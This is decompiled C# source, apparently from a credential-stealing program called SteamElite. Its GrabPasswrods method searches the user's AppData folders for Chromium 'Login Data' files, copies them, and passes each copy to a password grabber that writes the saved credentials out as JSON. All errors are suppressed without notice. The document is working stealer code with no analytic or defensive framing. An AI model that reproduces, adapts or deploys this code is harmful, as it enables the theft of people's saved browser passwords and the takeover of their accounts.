// Decompiled with JetBrains decompiler
// Type: SteamElite.GetBrowsersP
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace SteamElite
{
  internal class GetBrowsersP
  {
    public static void GrabPasswrods()
    {
      try
      {
        string path1 = Program.path;
        ChromePasswordsGraber chromePasswordsGraber = new ChromePasswordsGraber();
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        string[] strArray = new string[2]
        {
          Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
          Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        };
        foreach (string path2 in strArray)
          stringList2.AddRange((IEnumerable<string>) Directory.GetDirectories(path2));
        foreach (string path2 in stringList2)
        {
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories));
          }
          catch
          {
          }
        }
        for (int index = 0; index < stringList1.Count; ++index)
        {
          string str1 = stringList1[index].Split('\\')[5];
          try
          {
            string str2 = path1 + str1 + "C";
            File.Copy(stringList1[index], str2);
            chromePasswordsGraber.GetPSW(str2, str2 + "_Passwords.json");
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }
  }
}
